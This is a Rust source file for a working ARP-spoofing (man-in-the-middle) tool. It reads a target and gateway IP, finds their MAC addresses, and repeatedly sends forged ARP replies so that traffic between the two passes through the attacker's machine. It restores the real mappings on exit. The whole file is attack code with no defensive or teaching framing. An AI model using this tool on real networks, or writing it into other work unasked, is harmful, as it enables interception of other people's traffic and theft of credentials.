use getopts::Options;
use std::env;
use std::process;
use rand::Rng;
use std::str::FromStr;
use std::{thread, time::Duration};
use std::net::{IpAddr, Ipv4Addr, UdpSocket};
use procfs::net;

use pnet::datalink::{self, NetworkInterface, MacAddr};
use pnet::datalink::Channel::Ethernet;
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::EtherTypes;
use pnet::packet::ethernet::MutableEthernetPacket;
use pnet::packet::{Packet, MutablePacket};
use ctrlc;

// prints usage instructions
fn print_usage(program: &str, opts: Options) {
  let usage = format!("usage: {} -i <iface> -t <target_ip> -g <gateway_ip>", program);
  print!("{}", opts.usage(&usage));
}

// sends udp packet to port 53 to populate arp cache for the target ip
fn populate_arp_cache(source_ip: &String, target_ip: &String) -> usize {
  let src_port = rand::thread_rng().gen_range(49152..65535);
  let src_addr = format!("{}:{}", source_ip, src_port);
  let dst_addr = format!("{}:53", target_ip);
  let socket = UdpSocket::bind(src_addr).expect("couldn't bind to address");

  socket.send_to(&[], dst_addr).expect("couldn't populate arp cache")
}

// lookups mac address from arp cache for the specified ip
fn lookup_arp_cache(ip: &Ipv4Addr) -> Option<[u8; 6]> {
  let arp_entries = net::arp().expect("couldn't read arp table");

  for e in arp_entries {
    if ip.eq(&e.ip_address) {
      return e.hw_address;
    }
  }

  None
}

// crafts arp packet
fn send_arp(iface: &NetworkInterface, src_mac: MacAddr, src_ip: Ipv4Addr, dst_mac: MacAddr, dst_ip: Ipv4Addr) {
  // create datalink level channel
  let (mut sender, mut _receiver) = match datalink::channel(&iface, Default::default()) {
    Ok(Ethernet(sender, receiver)) => (sender, receiver),
    Ok(_) => panic!("unhandled channel type"),
    Err(e) => panic!("error creating datalink channel: {}", e)
  };

  let mut ethernet_buffer = [0u8; 42];
  let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

  ethernet_packet.set_destination(dst_mac);
  ethernet_packet.set_source(src_mac);
  ethernet_packet.set_ethertype(EtherTypes::Arp);

  let mut arp_buffer = [0u8; 28];
  let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();

  arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
  arp_packet.set_protocol_type(EtherTypes::Ipv4);
  arp_packet.set_hw_addr_len(6);
  arp_packet.set_proto_addr_len(4);
  arp_packet.set_operation(ArpOperations::Reply);
  arp_packet.set_sender_hw_addr(src_mac);
  arp_packet.set_sender_proto_addr(src_ip);
  arp_packet.set_target_hw_addr(dst_mac);
  arp_packet.set_target_proto_addr(dst_ip);

  ethernet_packet.set_payload(arp_packet.packet_mut());

  sender
    .send_to(ethernet_packet.packet(), None)
    .unwrap()
    .unwrap();

  println!("{} {}: arp reply {} is-at {}", src_mac.to_string(), dst_mac.to_string(), src_ip.to_string(), src_mac.to_string())
}

fn main() {
  let args: Vec<String> = env::args().collect();
  let program = args[0].clone();

  let mut opts = Options::new();
  opts.optopt("i", "iface", "set network interface", "NETWORK_INTERFACE");
  opts.optopt("t", "target_ip_str", "set target ip", "TARGET_IP_str");
  opts.optopt("g", "gateway_ip_str", "set gateway ip", "GATEWAY_IP_str");
  opts.optflag("h", "help", "prints usage instructions");

  let matches = match opts.parse(&args[1..]) {
    Ok(m) => { m }
    Err(e) => { panic!("{}", e) }
  };

  if matches.opt_present("h") {
    print_usage(&program, opts);
    return;
  }

  let iface_str = matches.opt_str("i").expect("couldn't set network interface");
  let target_ip_str = matches.opt_str("t").expect("couldn't set target ip");
  let gateway_ip_str = matches.opt_str("g").expect("couldn't set gateway ip");
  let target_ip = Ipv4Addr::from_str(&target_ip_str).expect("couldn't convert string target ip");
  let gateway_ip = Ipv4Addr::from_str(&gateway_ip_str).expect("couldn't convert string gateway ip");

  let ifaces_match = |iface: &NetworkInterface| iface.name == iface_str;

  // find network interface by name
  let ifaces = datalink::interfaces();
  let iface = ifaces.into_iter().filter(ifaces_match).next().unwrap();

  let self_ip = iface
    .ips
    .iter()
    .find(|ip| ip.is_ipv4())
    .map(|ip| match ip.ip() {
      IpAddr::V4(ip) => ip,
      _ => unreachable!(),
    }).expect("couldn't set source ip");

  let self_ip_str = self_ip.to_string();

  populate_arp_cache(&self_ip_str, &target_ip_str);
  populate_arp_cache(&self_ip_str, &gateway_ip_str);

  let target_mac_arr = lookup_arp_cache(&target_ip).expect("couldn't lookup mac address for target ip");
  let gateway_mac_arr = lookup_arp_cache(&gateway_ip).expect("couldn't lookup mac address for gateway ip");

  let spoof_mac = iface.mac.unwrap();
  let target_mac = MacAddr::new(
    target_mac_arr[0],
    target_mac_arr[1],
    target_mac_arr[2],
    target_mac_arr[3],
    target_mac_arr[4],
    target_mac_arr[5],
  );
  let gateway_mac = MacAddr::new(
    gateway_mac_arr[0],
    gateway_mac_arr[1],
    gateway_mac_arr[2],
    gateway_mac_arr[3],
    gateway_mac_arr[4],
    gateway_mac_arr[5],
  );

  let iface_clone = iface.clone();
  ctrlc::set_handler(move || {
    println!("\ncleaning up and re-arping targets");
    for _i in 0..3 {
      // re-arp gateway
      send_arp(&iface_clone, target_mac, target_ip, gateway_mac, gateway_ip);

      // re-arp target
      send_arp(&iface_clone, gateway_mac, gateway_ip, target_mac, target_ip);
      thread::sleep(Duration::from_millis(1000));
    }
    process::exit(0);
  }).expect("couldn't set ctrl+c handler");

  loop {
    // arp poison target
    send_arp(&iface, spoof_mac, gateway_ip, target_mac, target_ip);
    // arp poison gateway
    send_arp(&iface, spoof_mac, target_ip, gateway_mac, gateway_ip);
    thread::sleep(Duration::from_millis(2000));
  }
}
